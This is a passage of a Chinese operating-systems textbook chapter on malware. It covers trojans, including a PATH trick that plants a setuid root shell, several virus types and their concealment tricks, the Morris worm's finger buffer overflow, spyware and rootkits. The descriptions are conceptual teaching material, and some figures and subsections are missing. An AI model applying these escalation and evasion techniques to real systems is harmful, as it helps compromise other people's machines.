在被感染的机器 中通常都会安装一个后门程序 (backdoor), 以便犯罪者可以随时向该机器发出指令，以方便地控制该 机器。
以这种方式被控制的机器叫作僵尸机器 (zombie), 而所有被控制的机器合起来称作僵尸网络 (botnet, 是robot network的缩写)。
控制一个僵尸网络的罪犯可能出于恶意的目的(通常是商业目的)将这个网络租借出去。
最通常的 一种是利用该网络发送商业垃圾邮件。
当一次垃圾邮件的攻击在网上爆发，警方介入并试图找到邮件的 来源，他们最终会发现这些邮件来自全世界成千上万台计算机，如果警方继续深入调查这些计算机的拥 有者，他们将会看到从孩子到老妇的各色人物，而其中不会有任何人承认自己发送过垃圾邮件。
可见利 用别人的机器从事犯罪活动使得找到幕后黑手成为一件困难的事情。
恶意软件的另一个应用是在被感染机器中安装一个记录用户所有敲击键盘动作的软件——键盘记录 器 (keylogger), 该软件每隔一段时间将记录的结果发送给其他某台机器或一组机器(包括僵尸机器), 最终发送到罪犯手中。
一些提供中间接收和发送信息的机器的互联网提供者通常是罪犯的同伙，但调查 他们同样困难。
为了防止这类犯罪，信用卡公司都采取人工智能软件检测某次不同寻常的消费行为。
例如，如果一 个人通常情况下只会在本地的小商店中使用他的信用卡，而某一天它突然预订了很多台昂贵的笔记本电 脑并要求将他们发送到塔吉克斯坦的某个地址。
这时信用卡公司的警报会响起，员工会与信用卡拥有者 进行联系，以确认这次交易。
当然犯罪分子也知道这种防御软件，因此他们会试图调整自己的消费习惯， 并力图避开系统的检测。
信息，如他的生日、母亲出嫁前的姓名、社会安全码、银行账号、密码等，因此可以成功地模仿受害者， 并得到新的实物文档，如替换驾驶执照、银行签账卡 (bank debit card)、出生证明等。
这些信息可能被 卖给其他罪犯，从而从事更多犯罪活动。
利用恶意软件从事的另一种犯罪是窃取用户账户中的财产，该类恶意软件平时一直处在潜伏状态， 直到用户正确地登录到他的网络银行账户中去，该软件立刻发起一次快速的交易，查看该账户有多少余 额，并将所有的钱都转到罪犯的账户中，这笔钱接着连续转移很多个账户，以便警方在追踪现金流走向 的时候需要花很多天甚至几个星期来获得查看账户的相关许可。
这种犯罪通常设计很大的交易量，已经 不能视为青少年的恶作剧了。
恶意软件不只会被有组织的犯罪团伙所使用，在工业生产中同样可以看到其身影。
一个公司可能会 向对手的工厂中安装一些恶意软件，当这些恶意软件检测到没有管理员处于登录状态时，便会运行并干 扰正常的生产过程，降低产品的质量，以此来给竞争对手制造麻烦。
而在其他情况下这类恶意软件不会 做任何事情，因此难以被检测到。
一些人无论走到哪里肩膀上都会有一个芯片(请不要与肩膀上的RFID 芯片弄混)。
他们对社会充满 了或真实或想象中的怨恨，想要进行报复。
此时他们可能会选择恶意软件。
很多现代计算机将BIOS保存 在闪存中，闪存可以在程序的控制下被重写(以便生产者可以方便地修正其错误)。
恶意软件向闪存中随 机地写入垃圾数据，使得电脑无法启动。
如果闪存在电脑插槽中，那么修复这个问题需要将电脑打开， 并且换一个新的闪存；如果闪存被焊接在母板上，可能整块母板都可能作废，不得不买一块新的母板。
我们不打算继续深入地讨论这个问题，读者到这里已经了解关于恶意软件的基本情况，如果想了解 更多内容，请在搜索引擎中输入“恶意软件”。
在下面的几节中我们将会看到恶意软件更为一般化的形式，读者将会看到这些软件是如何组织并传 播的。
之后我们会提供对恶意软件的一些防御方法。
9.9.1 特洛伊木马
编写恶意代码是第一步，你可以在你的卧室里完成这件事情。
然而让数以百万计的人将你的程序安 装到他们的电脑中则是完全不同的另一件事。
我们的软件编写者Mal 该如何做呢?
一般的方法是编写一 些有用的程序，并将恶意代码嵌入到其中。
游戏、音乐播放器、色情书刊阅览器等都是比较好的选择。
人们会自愿地下载并安装这些应用程序。
作为安装免费软件的代价，他们也同时安装了恶意软件。
这种 方式叫作木马攻击(Torjan horse attack),引自希腊荷马所做《奥德赛》中装满了希腊士兵的木马。
在 计算机安全世界中，它指人们自愿下载的软件中所隐藏的恶意软件。
码还包括一些指令，使得它在计算机每次重新启动的时候自动启动，这一点所有的操作系统都可以做到。
木马攻击的美妙之处在于，木马的拥有者不必自己费尽心机侵入到受害者的计算机中，因为木马是 由受害者自己安装的。
还有许多其他方法引诱受害人执行特洛伊木马程序。
如，许多UNIX 用户都有一个环境变量$PATH, 这是一个控制查找哪些目录的命令。
在shell 程序中键入
echo $PATH
就可以查看。
例如，用户ast 在系统上设置的环境变量可能会包括以下目录：
:/usr/ast/bin:/usr/local/bin:/usr/bin:/bin:/usr/bin/X11:/usr/ucb:/usr/man\
:/usr/java/bin:/usr/java/lib:/usr/local/man:/usr/openwin/man
其他用户可能设置不同的查找路径。
当用户在shell 中键入
prog
Mal, 一个恶意的但合法的用户，也可能为超级用户放置陷阱。
他用含有特洛伊木马程序的Is 命令 更换了原有的版本，然后假装做一些秘密的操作以引起超级用户的注意，如同时打开100个计算约束进 程。
当超级用户键入下列命令来查看Mal 的目录时机会就来了：
cd /home /mal
Is-I
既然某些shell 程序在通过$PATH工作之前会首先确定当前所在的目录，那么超级用户可能会刚刚激 活Mal 放置的特洛伊木马。
特洛伊木马可以把/usr/mal/bin/sh 的 SETUID 设 为root 。
接着它执行两个操作： 用chown 把/usr/mal/bin/sh 的owner 改 为root, 然 后 用chmod 设 置SETUID 位。
现在Mal 仅仅通过运行shell 就可以成为超级用户了。
如果Mal 发现自己缺钱，他可能会使用下面的特洛伊木马来找钱花。
第一个方法是，特洛伊木马程 序安装诸如Quicken 之类的软件检查受害人是否有银行联机程序，如果有就直接把受害人账户里的钱转 到一个用于存钱的虚拟账户(特别是国外账户)里。
第二个方法是，特洛伊木马首先关闭modem 的声音，然后拨打900号码(支付号码)到偏远国家， 如摩尔多瓦(前苏联的一部分)。
如果特洛伊木马运行时用户在线，那么摩尔多瓦的900号码就成为该用 户的Internet 接入提供者(非常昂贵),这样用户就不会发觉并在网上待上好几个小时。
上述两种方法都 不仅仅是假设：它们都曾发生并被Denning(1999) 报道过。
关于后一种方法，曾经有800000分钟连接 到摩尔多瓦，直到美国联邦交易局断开连接并起诉位于长岛的三个人。
他们最后同意归还38000个受害 者的274万美元。
9.9.2 病毒
本节我们将介绍病毒，接下来将介绍蠕虫。
互联网上已有很多病毒方面的信息，这些“魔鬼”早已 从瓶子里跑出来了。
另外，人们在不知道病毒工作原理的情况下很难去防御它们，而且关于病毒的传播 有许多错误的观念需要纠正。
那么,什么是病毒呢?
长话短说，病毒 (virus) 是一种特殊的程序，它可以通过把自己植入到其他 程序中来进行“繁殖”,就像生物界中真正的病毒那样。
除了繁殖自身以外，病毒还可以做许多其他的 事情。
蠕虫很像病毒，但其不同点是通过自己复制自己来繁殖。
不过这不是我们关注的重点，因此下面 我们将用“病毒”来统称上面两种恶意程序。
有关蠕虫的内容会在9.7.3节中讲解。
1.病毒工作原理
让我们看一下病毒有哪些种类以及它们是如何工作的。
病毒的制造者，我们称之为Virgil, 可能用 汇编语言(或者C 语言)写了一段很小但是有效的病毒。
在他完成这个病毒之后，他利用一个叫作 dropper 的工具把病毒插入到自己计算机的程序里，然后让被感染的程序迅速传播。
也许贴在公告板上， 也许作为免费软件共享在Internet 上。
这一程序可能是一款激动人心的游戏， 一个盗版的商业软件或其他 能引人注意的软件。
随后人们就开始下载这一病毒程序。
一旦病毒程序被安装到受害者的计算机里，病毒就处于休眠状态直到被感染的程序被执行。
发作时， 它感染其他程序并执行自己的操作。
通常，在某个特定日期之前病毒是不执行任何操作的，直到某一天 它认为自己在被关注前已被广泛传播时才发作。
被选中的日期可能是发送一段政治信息(如在病毒编写 者所在的宗教团体受辱的100周年或500周年纪念日触发)。
在下面的讨论中，我们来看一下感染不同文件的七种病毒。
他们是共事者、可执行程序、内存、引 导扇区、驱动器、宏以及源代码病毒。
毫无疑问，新的病毒类型不久就会出现。
2.共事者病毒
共事者病毒(companion virus) 并不真正感染程序，但当程序执行的时候它也执行。
下面的例子很 容易解释这个概念。
在MS-DOS 中，当用户输入
prog
MS-DOS 首先查找叫作prog.com的程序。
如果没有找到就查找叫作prog.exe的程序。
在Windows 里，当用 户点击Start ( 开 始 ) 和Run (运行)后，同样的结果会发生。
现在大多数的程序都是.exe 文件， .com 文 件几乎很少了。
假设Virgil 知道许多人都在MS-DOS 提示符下或点击Windows 的 Run运行prog.exe 。
他就能简单地制 造一个叫作prog.com 的病毒，当人们试图运行prog (除非输入的是全名prog.exe) 时就可以让病毒执行。
当prog.com完成了工作，病毒就让prog.exe开始运行而用户显然没有这么聪明。
有时候类似的攻击也发生在Windows 操作系统的桌面上，桌面上有连接到程序的快捷方式(符号链 接)。
病毒能够改变链接的目标，并指向病毒本身。
当用户双击图标时，病毒就会运行。
运行完毕后， 病毒又会启动正常的目标程序。
3.可执行程序病毒
更复杂的一类病毒是感染可执行程序的病毒。
它们中最简单的一类会覆盖可执行程序，这叫作覆盖 病 毒 (overwriting virus)。
它们的感染机制如图9-28所示。
病毒的主程序首先将自己的二进制代码复制到数组里，这是通过打开argv[0] 并将其读取以便安全调 用来完成的。
然后它通过将自己变为根目录来截断由原来的根目录开始的整个文件系统，将根目录作为 参数调用search 过程。
递归过程search 打开一个目录，每次使用readdir 命令逐一读取入口地址，直到返回值为NULL, 说 明所有的入口都被读取过。
如果入口是目录，就将当前目录改为该目录，继续递归调用search; 如果入 口是可执行文件，就调用infect 过程来感染文件，这时把要感染的文件名作为参数。
以“.”开头的文件 被跳过以避免“.”和“..”目录带来的问题。
同时符号链接也被跳过，因为系统可以通过chdir 系统调用 进入目录并通过转到“..”来返回，这种对硬连接成立，对符号链接不成立。
更完善的程序同样可以处 理符号链接。
真正的感染程序infect (尚未介绍)仅仅打开在其参数中指定的文件并把数组里存放的病毒代码复 制到文件里，然后再关闭文件。
图9-28 在UNIX系统上查找可执行文件的递归过程
病毒可以通过很多种方法不断“改善”。
第一，可以在infect 里插入产生随机数的测试程序然后悄然 返回。
如调用超过了128次病毒就会感染，这样就降低了病毒在大范围传播之前就被被检测出来的概率。
生物病毒也具有这样的特性：那些能够迅速杀死受害者的病毒不如缓慢发作的病毒传播得快，慢发作给 了病毒以更多的机会扩散。
另外一个方法是保持较高的感染率(如25%),但是一次大量感染文件会降 低磁盘性能，从而易于被发现。
第 二 ，infect 可以检查文件是否已被感染。
两次感染相同的文件无疑是浪费时间。
第三，可以采取 方法保持文件的修改时间及文件大小不变，这样可以协助把病毒代码隐藏起来。
对大于病毒的程序来说， 感染后程序大小将保持不变；但对小于病毒大小的程序来说，感染后程序将变大。
多数病毒都比大多数 程序小，所以这不是一个严重的问题。
一般的病毒程序并不长(整个程序用C语言编写不超过1页，文本段编译后小于2KB), 汇编语言编
写的版本将更小。
Ludwig(1998) 曾经给出了一个感染目录里所有文件的MS-DOS 病毒，用汇编语言编 写并编译后仅有44个字节。
稍后的章节将研究反病毒程序，这种反病毒程序可以跟踪病毒并除去它们。
而且，在图9-28里很有趣 的情况是，病毒用来查找可执行文件的方法也可以被反病毒程序用来跟踪被感染的文件并最终清除病毒。
感染机制与反感染机制是相辅相成的，所以为了更有效地打击病毒，我们必须详细理解病毒工作的原理。
从Virgil的观点来说，病毒的致命问题在于它太容易被发现了。
毕竟当被感染的程序运行时，病毒就会 感染更多的文件，但这时该程序就并不能正常运行，那么用户就会立即发现。
所以，有相当多的病毒把自 己附在正常程序里，在病毒发作时可以让原来的程序正常工作。
这类病毒叫作寄生病毒 (parasitic virus)。
图9-29 a) 一段可执行程序；b) 病毒在前端；c) 病毒在后端；d) 病毒充斥在程序里的多余空间里
为了避免从前端装入病毒代码带来的复杂操作，大多数病毒是后端装入的，把它们自己附在可执行 程序末端而不是前端，并且把文件头的起始地址指向病毒，如图9-29c所示。
现在病毒要根据被感染程 序的不同在不同的虚拟地址上运行，这意味着Virgil 必须使用相对地址，而不是绝对地址来保证病毒是 位置独立的。
对资深的程序员来说，这样做并不难，并且一些编译器根据需要也可以完成这件事。
4. 内存驻留病毒
到目前为止，我们假设当被感染的程序运行时，病毒也同时运行，然后将控制权交给真正的程序， 最后退出。
内存驻留病毒 (memory-resident virus)与此相反，它们总是驻留在内存中 (RAM), 要么藏 在内存上端，要么藏在下端的中断变量中。
聪明的病毒甚至可以改变操作系统的RAM 分布位图，让系 统以为病毒所在的区域已经占用，从而避免了被其他程序覆盖。
典型的内存驻留病毒通过把陷阱或中断向量中的内容复制到任意变量中之后，将自身的地址放置其 中，俘获陷阱或中断向量，从而将该陷阱或中断指向病毒。
最好的选择是系统调用陷阱，这样病毒就可 以在每一次系统调用时运行(在核心态下)。
病毒运行完之后，通过跳转到所保存的陷阱地址重新激活 真正的系统调用。
为什么病毒在每次系统调用时都要运行呢?
这是因为病毒想感染程序。
病毒可以等待直到发现一个 exec 系统调用，从而判断这是一个可执行二进制(而且也许是一个有价值的)代码文件，于是决定感染 它。
这一过程并不需要大量的磁盘活动，如图9-27所示，所以难以被发现。
捕捉所有的系统调用也给了 病毒潜在的能力，可以监视所有的数据并造成种种危害。
5.引导扇区病毒
正如我们在第5章所讨论的，当大多数计算机开机时，BIOS 读引导磁盘的主引导记录放入RAM中并 运行。
引导程序判断出哪一个是活动分区，从该分区读取第一个扇区，即引导扇区，并运行。
随后，系 统要么装入操作系统要么通过装载程序导入操作系统。
但是，多年以前Virgil的朋友发现可以制作一种 病毒覆盖主引导记录或引导扇区，并能造成灾难性的后果。
这种叫作引导扇区病毒 (boot sector virus), 它们现在已十分普遍了。
通常引导扇区病毒(包括MBR (主引导记录)病毒),首先把真正的引导记录扇区复制到磁盘的安 全区域，这样就能在完成操作后正常引导操作系统。
Microsoft 的磁盘格式化工具fdisk往往跳过第一个磁 道，所以这是在Windows 机器中隐藏引导记录的好地方。
另一个办法是使用磁盘内任意空闲的扇区，然 后更新坏扇区列表，把隐藏引导记录的扇区标记为坏扇区。
实际上，由于病毒相当庞大，所以它也可以 把自身剩余的部分伪装成坏扇区。
如果根目录有足够大的固定空间，如在Windows 98中，根目录的末端
也是一个隐藏病毒的好地方。
真正具有攻击性的病毒甚至可以为引导记录扇区和自身重新分配磁盘空间， 并相应地更新磁盘分布位图或空闲表。
这需要对操作系统的内部数据结构有详细的了解，不过Virgil 有 一个很好的教授专门讲解和研究操作系统。
当计算机启动时，病毒把自身复制到RAM 中，要么隐藏在顶部，要么在未使用的中断向量中。
由 于此时计算机处于核心态，MMU 处于关闭状态，没有操作系统和反病毒程序在运行，所以这对病毒来 说是天赐良机。
当一切准备就绪时，病毒会启动操作系统，而自己则往往驻留在内存里，所以它能够监 视情况变化。
然而，存在如何再次获取系统控制权的问题。
常用的办法要利用一些操作系统管理中断向量的技巧。
如Windows 系统在一次中断后并不重置所有的中断向量。
相反，系统每次装入一个设备驱动程序，每一 个都获取所需的中断向量。
这一过程要持续一分钟左右。
图9-30 a) 病毒捕获了所有的中断向量和陷阱向量后；b) 操作系统夺回了打印机中断向量；c) 病毒意识到 打印机向量的丢失并重新夺回了控制权
6.设备驱动病毒
7.宏病毒
许多应用程序，如Word 和Excel, 允许用户把一大串命令写入宏文件，以便日后一次按键就能够执 行。
宏可附在菜单项里，这样当菜单项被选中时宏就可以运行。
在Microsoft Office中，宏可以包含完全 用Visual Basic编程语言编写的程序。
宏程序是解释执行而不是编译执行的，但解释执行只影响运行速度 而不影响其执行的效果。
宏可以是针对特定的文档，所以Office就可以为每一个文档建立宏。
现在我们看一看问题所在。
Virgil 在Word里建立了一个文档并创建了包含OPEN FILE功能的宏。
这 个宏含有一个宏病毒代码。
然后他将文档发送给受害人，受害人很自然地打开文件(假设E-mail程序还 没有打开文件),导致OPEN FILE宏开始运行。
既然宏可以包含任意程序，它就可以做任何事情，如感 染其他的Word 文档，删除文件等。
对Microsoft来说，Word 在打开含有宏的文件时确实能给出警告，但 大多数用户并不理解警告的含义并继续执行打开操作。
而且，合法文件也会包含宏。
还有很多程序甚至 不给出警告，这样就更难以发现病毒了。
随着E-mail附件数量的增长，发送嵌有宏病毒的文档成为越来越严重的问题。
比起把真正的引导扇 区隐藏在坏块列表以及把病毒藏在中断向量里，这样的病毒更容易编写。
这意味着更多缺乏专业知识的 人都能制造病毒，从而降低了病毒产品的质量，给病毒制造者带来了坏名声。
8.源代码病毒
#include<virus.h>
还可以插入下面一行来激活病毒：
run_virus();
判断在什么地方插入需要对C 程序代码进行分析，插入的地方必须能够允许合法的过程调用并不会成为 无用代码(如插入在return语句后面)。
插入在注释语句里也没什么效果，插入在循环语句里倒可能是个 极好的选择。
假设能够正确地插入对病毒代码的调用(如正好在main过程结束前，或在return 语句结束 前),当程序被编译时就会从virus.h处(虽然proj.h 可能会引起更少的注意)获得病毒。
当程序运行时，病毒也被调用。
病毒可以做任何操作，如查找并感染其他的C语言程序。
一旦找到 一个C 语言程序，病毒就插入上面两行代码，但这样做仅对本地计算机有效，并且virus.h必须安放妥当。
要使病毒对远程计算机也奏效，程序中必须包括所有的病毒源代码。
这可以通过把源代码作为初始化后 字符串来实现，特别是使用一串32位的十六进制整数来防止他人识破企图。
字符串也许会很长，但是对 于今天的大型代码而言，这是可以轻易实现的。
对初学读者来说，所有这些方法看起来都比较复杂。
有人也许会怀疑这样做是否在操作上可行。
事实 上是可行的。
Virgil是极为出色的程序员，而且他手头有许多空闲时间。
读者可以看看当地的报纸就知道了。
9.病毒如何传播
病毒的传播需要很多条件。
让我们从最古典的方式谈起。
Virgil编写了一个病毒，把它放进了自己的 程序(或窃取来的程序)里，然后开始分发程序，如放入共享软件站点。
最后，有人下载并运行了程序。
这时有好几种可能。
病毒可能开始感染硬盘里的大多数文件，其中有些文件被用户共享给了自己的朋友。
病毒也可以试图感染硬盘的引导扇区。
一旦引导扇区被感染，就很容易在核心态下放置内存驻留病毒。
运行在局域网上的计算机通常有能力通过Internet 或私人网络登录到远程计算机上，或者甚至有权 无须登录就远程执行命令。
这种能力为病毒提供了更多传播的机会。
所以往往一个微小的错误就会感染 整个公司。
要避免这种情况，所有的公司应该制定统一的策略防止系统管理员犯错误。
另一种传播病毒的方法是在经常发布程序的USENET 新闻组或网站上张贴已被感染病毒的程序。
也 可以建立一个需要特别的浏览器插件的网页，然后确保插件被病毒感染上。
还有一种攻击方式是把感染了病毒的文档通过E-mail 方式或USENET 新闻组方式发送给他人，这些
安 全 381
文档被作为邮件的附件。
人们从未想到会去运行一个陌生人邮给他们的程序，他们也许没有想到，点击 打开附件导致在自己的计算机上释放了病毒。
更糟的是，病毒可以寻找用户的邮件地址簿，然后把自己 转发给地址簿里所有的人，通常这些邮件是以看上去合法的或有趣的标题开头的。
例如：
Subject:Change of plans
Subject:Re:that last e-mail
Subject:The dog died last night
Subject:I am seriously ill
Subject:I love you
当邮件到达时，收信人看到发件人是朋友或同事，就不会怀疑有问题。
而一旦邮件被打开就太晚了。
“I LOVE YOU” 病毒在2000年6月就是通过这种方法在世界范围内传播的，并导致了数十亿美元的损失。
与病毒的传播相联系的是病毒技术的传播。
在Internet 上有多个病毒制造小组积极地交流，相互帮助 开发新的技术、工具和病毒。
他们中的大多数人可能是对病毒有癖好的人而不是职业罪犯，但带来的后 果却是灾难性的。
另一类病毒制造者是军人，他们把病毒作为潜在的战争武器来破坏敌人的计算机系统。
与病毒传播相关的另一个话题是逃避检测。
监狱的计算设施非常差，所以Virgil 宁愿避开他们。
如 果Virgil 将最初的病毒从家里的计算机张贴到网上，就会产生危险。
一旦攻击成功，警察就能通过最近 病毒出现过的时间信息跟踪查找，因为这些信息最有可能接近病毒来源。
为了减少暴露，Virgil 可能会通过一个偏远城市的网吧登录到Internet 上。
他既可以把病毒带到软盘 上自己打开，也可以在没有软磁盘驱动器的情况下利用隔壁女士的计算机读取book.doc 文件以便打印。
一旦文件到了Virgil 的硬盘，他就将文件名改为Virus.exe 并运行，从而感染整个局域网，并且让病毒在 两周后激活，以防警察列出一周内进出该城市机场的可疑人员名单。
关于病毒还有很多需要讨论的内容，尤其是他们如何隐藏自己以及杀毒软件如何将之发现。
在本章 后面讨论恶意软件防护的时候我们会回到这个话题。
9.9.3 蠕 虫
互联网计算机发生的第一次大规模安全灾难是在1988年的11月2日，当时Cornell大学毕业生Robert Tappan Morris在Internet 网上发布了一种蠕虫程序，结果导致了全世界数以千计的大学、企业和政府实 验室计算机的瘫痪。
这也导致了一直未能平息的争论。
我们稍后将重点描述。
具体的技术细节请参阅 Spafford 的论文(1989版),有关这一事件的警方惊险描述请参见Hafner 和Markoff 的书(1991版)。
故事发生在1988年的某个时候，当时Morris 在Berkeley 大学的UNIX 系统里发现了两个bug, 使 他 能 不经授权接触到Internet 网上所有的计算机。
Morris 完全通过自身努力，写了一个能够自我复制的程序， 叫 作蠕 虫 (worm)。
蠕虫可以利用UNIX 的bug, 在数秒钟内自我复制，然后迅速传染到所有的机器。
Morris 为此工作了好几个月，并想方设法调试以逃避跟踪。
从技术上来说，蠕虫包含了两部分程序，引导程序和蠕虫本身。
引导程序是99行的称为11.c的程序， 它在被攻击的计算机上编译并运行。
一旦发作，它就在源计算机与宿主机之间建立连接，上传蠕虫主体 并运行。
在花费了一番周折隐藏自身后，蠕虫会查看新宿主机的路由表看它是否连接到其他的机器上， 通过这种方式蠕虫把引导程序传播到所有相连的机器。
蠕虫在感染新机器时有三种方法。
方法1是试图使用rsh 命令运行远程shell 程序。
有些计算机信任其 他机器，允许其他机器不经校验就可运行rsh命令。
如果方法一可行，远程shell会上传蠕虫主体，并从那 里继续感染新的计算机。
方法2是使用一种在所有系统上叫作finger 的程序，该程序允许Internet 上任何地方的用户通过键入 finger name@site
来显示某人在特定安装下的个人信息。
这些信息通常包括：个人姓名、登录名、工作和家庭地址、电话 号码、传真号码以及类似的信息。
这有点像电话本。
finger 是这样工作的。
在每个站点有一个叫作finger 守护进程的后台进程，它一直保持运行状态，监 视并回答所有来自因特网的查询。
蠕虫所做的是调用finger, 并用一个精心编写的、由536个特殊字节组 成的字符串作为参数。
这一长串覆盖了守护进程的缓冲和栈，如图9-21c 所示。
这里所利用的缺陷是守 护进程没有检查出缓冲区和栈的溢出情形。
当守护进程从它原先获得请求时所在的过程中返回时，它返 回的不是main, 而是栈上536字节中包含的过程。
该过程试图运行sh 。
如果成功，蠕虫就掌握了被攻击 计算机里运行的shell。
方法3是依靠电子邮件系统里的sendmail程序，利用它的bug允许蠕虫发送引导程序的备份并运行。
蠕虫一旦出现就准备破解用户密码。
Morris 没有在这方面做大量的有关研究。
他所做的是问自己的 父亲， 一名美国国家安全局(该局是美国政府的密码破解机构)的安全专家，要一份Morris Sr.和 Ken Thompson 十年前在Bell实验室合著的经典论文 (Morris 和Thompson,1979) 。
每个被破译的密码允许蠕虫 登录到任何该密码所有者具有账号的计算机上。
每一次蠕虫访问到新的机器，它就查看是否有其他版本的蠕虫已经存活。
如果有，新的版本就退出， 但七次中有一次新蠕虫不会退出。
即使系统管理员启动了旧蠕虫来愚弄新蠕虫也是如此，这大概是为了 给自己做宣传。
结果，七次访问里的一次产生了太多的蠕虫，导致了所有被感染机器的停机：它们被蠕 虫感染了。
如果Morris 放弃这一策略，只是让新蠕虫在旧蠕虫存在的情况下退出，蠕虫也许就不那么容 易被发现了。
Morris 的一个朋友试图向纽约时报记者John Markoff说明整个事件是个意外、蠕虫是无害的，而 此时Morris 本人却被捕了。
Morris 的朋友不经意地流露出罪犯的登录名是rtm 。
把rtm 转换成用户名十 分简单——Markoff 所要做的只是运行finger 。
第二天，故事上了头条新闻，三天后影响力甚至超过了 总统选举。
这一事件导致的永久结果是建立了计算机应急响应机构 (Computer Emergency Response Team, CERT), 这是一个发布病毒入侵报告的中心机构，有多名专家分析安全问题并设计补丁程序。
CERT 有了 自己的下载网站，CERT 收集有关会受到攻击的系统缺陷方面的信息并告知如何修复。
重要的是，它把这 类信息周期发布给Internet 上的数以千计的系统管理员。
但是，某些别有用心的人(可能假装成系统管理 员)也可以得到关于系统bug的报告，并在这些bug修复之前花费数小时(或数天)寻找破门的捷径。
从Morris 蠕虫出现开始，越来越多种类的蠕虫病毒出现在网络上。
这些蠕虫病毒的机制与Morris 一 样，所不同之处只是利用系统中不同软件的不同漏洞。
由于蠕虫能够自我复制，因此扩散趋势比病毒要 快。
其结果是，越来越多的反蠕虫技术被开发出来，它们大多都试图在蠕虫第一次出现的时候将其发现， 而不是在它们进入中心数据库时才实施侦测 (Portokalidis 和 Bos,2007)。
9.9.4 间谍软件
其他人通过努力，进一步地尝试定义间谍软件。
Barwinski 等人认为它有四个特征：首先，它隐藏 自身，所以用户不能轻易地找到；其次，它收集用户数据(如访问过的网址、密码或信用卡号);再次， 它将收集到的资料传给远程的监控者；最后，在卸载它时，间谍软件会试图进行防御。
此外， 一些间谍 软件改变设置或者进行其他的恶意行为。
Barwinski 等人将间谍软件分成了三大类。
第一类是为了营销：该类软件只是简单地收集信息并发 送给控制者，以更好地将广告投放到特定的计算机。
第二类是为了监视：某些公司故意在职员的电脑上 安装间谍软件，监视他们在做什么,在浏览什么网站。
第三类接近于典型的恶意软件，被感染的电脑成 为僵尸网络中的一部分，等待控制者的指令。
他们做了一个实验，通过访问5000个网站看什么样的网站含有间谍软件。
他们发现这些网站和成人 娱乐、盗版软件、在线旅行有关。
华盛顿大学做了一个覆盖面更广的调查 (Moshchuk 等人，2006)。
在他们的调查中，约18000000 个URL 被感染，并且6%被发现含有间谍软件。
所以AOL/NCSA 所作的调查就不奇怪了：在接受调查的 家用计算机中，80%深受间谍软件的危害，平均每台计算机有93个该类软件。
华盛顿大学的调查发现成 人、明星和桌面壁纸相关的网站有最高的感染率，但他们没有调查旅行相关的网站。
1.间谍软件如何扩散
显然，接下来的问题是：“一台计算机是如何被间谍软件感染的?
”一种可能途径和所有的恶意软 件是一样的：通过木马。
不少的免费软件是包含有间谍软件的，软件的开发者可能就是通过间谍软件而 获 利 的 。
P2P 文件共享软件(比如Kazaa) 就是间谍软件的温床。
此外，许多网站显示的广告条幅直接指 向了含有间谍软件的网页。
另一种主要的感染途径叫作 下 载 驱 动(drive-by down load),仅仅访问网页就可能感染间谍软件 (实际上是恶意软件)。
执行感染的技术有三种。
首先，网页可能将浏览器导向一个可执行文件(.exe) 。
当浏览器访问此文件时，会弹出一个对话框提示用户运行、或保存该文件。
因为合法文件的下载也是一 样的机制，所以大部分用户直接点击执行，导致浏览器下载并运行该软件。
然后电脑就被感染了，间谍 软件可以做它想做的任何事。
第二种常见的途径是被感染的工具条。
IE 和Firefox 这两种浏览器都支持第三方工具条。
一些间谍软 件的作者创建很好看的功能也不错的工具条，然后广泛地宣传。
用户一旦安装了这样的工具条也就被感 染了，比如，流行的Alexa 工具条就含有间谍软件。
从本质上讲，这种感染机制很像木马，只是包装不同。
第三种感染的途径更狡猾。
很多网页都使用一种微软的技术，叫作ActiveX 控件。
这些控件是在浏 览器中运行并扩展其功能的二进制代码。
例如，显示某种特定的图片、音频或视频网页。
从原则上讲， 这些技术非常合法。
实际上它非常的危险，并可能是间谍软件感染的主要途径。
这项技术主要针对IE, 很少针对Firefox 或其他类型的浏览器。
当访问一个含有ActiveX 控件的网页时，发生什么情况取决于IE的安全性设置。
如果安全性设置太 低，间谍软件就自动下载并执行了。
安全性设置低的原因是如果设置太高，许多的网页就无法正常显示 (或根本无法显示),或者IE会一直进行提示，而用户并不清楚这些提示的作用。
现在我们假设用户有很高的安全性设置。
当访问一个被感染的网页时，IE 检测到有ActiveX 控件， 然后弹出一个对话框，包含有网页内容提示，比如：
大多数人认为很不错，然后点“是”。
好吧，这是过去的事情。
聪明的用户可能会检查对话框其他 的内容，还有其他两项。
一个是指向从来没有听说过的，也没有包含任何有用信息的认证中心的链接， 这其实只表明该认证中心只担保这家网站的存在，并有足够的钱支付认证的费用。
ActiveX 控件实际上 可以做任何事情，所以它非常强大，并且可能让用户很头疼。
由于虚假的提示信息，即使聪明的用户也 常常选择“是”。
如果他们点“不是”,在网页上的脚本则利用IE的bug, 试图继续下载间谍软件。
不过没有可利用的 bug, 就会一次次试图下载该控件， 一次次的弹出同样的对话框。
此时，大多数人不知道该怎么办(打 开任务管理器，杀掉IE的进程),所以他们最终放弃并选择“是”。
2. 间谍软件的行为
现在让我们看看间谍软件的常见行为：
●更改浏览器主页。
· 修改浏览器收藏页。
· 更改用户默认的媒体播放器。
· 更改用户默认的搜索引擎。
●将网页上的广告条替换成间谍软件期望的样子。
· 不停地产生广告。
许多间谍软件有卸载程序，当这些卸载程序几乎不能用，所以经验不足的用户没有办法卸载。
幸运 的是，一个新的反间谍软件产业已经兴起，现有的反病毒厂商跃跃欲试。
间谍软件不应该和广告软件 (adware) 混淆起来，合法的软件生产商提供了两种软件版本： 一个含 有广告的免费版本和一个不含广告的付费版本。
软件生产商的这种办法非常聪明，用户为了不受广告的 烦扰，而不得不升级到付费版本。
9.9.5 rootkit
rootkit 是一个程序或一些程序和文件的集合，它试图隐藏其自身的存在，即使被感染主机的拥有者 已经决定对其进行定位和删除。
在通常情况下，rootkit 包含一些同样具有隐藏性的恶意软件。
rootkit 可 以用我们目前讨论过的任一方法进行安装，包括病毒、蠕虫和间谍软件，也可以通过其他方法进行安装。
我们将稍后讨论其中的一种。
1.rootkit的类型
我们讨论目前可能的五种rootkit。
根据 “rootkit 在哪里隐藏自己”,我们自底向上将rootkit分为如下几类：
3)内核rootkit。
目前最常见的rootkit感染操作系统并作为驱动程序或可引导内核模块隐藏于其中。
这 种rootkit 可以轻松地将一个大而复杂且频繁变化的驱动程序替换为一个新的驱动程序，这个新的驱动 程序既包含原驱动程序又包含rootkit。
4 ) 库rootkit 。
另 一 个rootkit 可以隐藏的地方是系统库，如Linux 中的libc 。
这种位置给恶意软件提供 了机会去检查系统调用的参数和返回值，并根据自身隐藏的需要更改这些参数和返回值。
5)应用程序rootkit 。
另一个隐藏rootkit的地方是在大的应用程序中，尤其是那些在运行时会创建很多新 文件的应用程序中(如用户分布图、图像预览等)。
